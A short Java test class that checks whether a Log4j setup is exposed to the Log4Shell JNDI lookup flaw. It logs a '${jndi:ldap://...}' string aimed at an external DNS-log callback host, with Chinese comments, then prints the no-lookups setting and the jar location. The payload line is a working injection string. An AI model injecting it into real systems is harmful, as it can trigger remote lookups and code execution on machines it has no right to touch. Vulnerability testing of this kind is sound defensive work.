package com.example.service.qa;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class JndiRestrictedLookupTest {
    public static void main(String[] args) {
        System.out.println("begin main..");

        Logger logger = LogManager.getLogger(LogManager.ROOT_LOGGER_NAME);
        logger.info("begin log...");
        logger.error("{}", "${jndi:ldap://log.xn--9tr.com/exp}"); // 5edd8b95.dns.1433.eu.org 这个域名替换成 https://log.xn--9tr.com/ 中的域名

// 打印 log4j2.formatMsgNoLookups 是否设置为 true
        System.out.println(System.getProperty("log4j2.formatMsgNoLookups"));
// 打印 jar包的版本是否为 2.10 以上
        System.out.println(logger.getClass().getProtectionDomain().getCodeSource().getLocation());
        logger.info("end log...");


    }
}
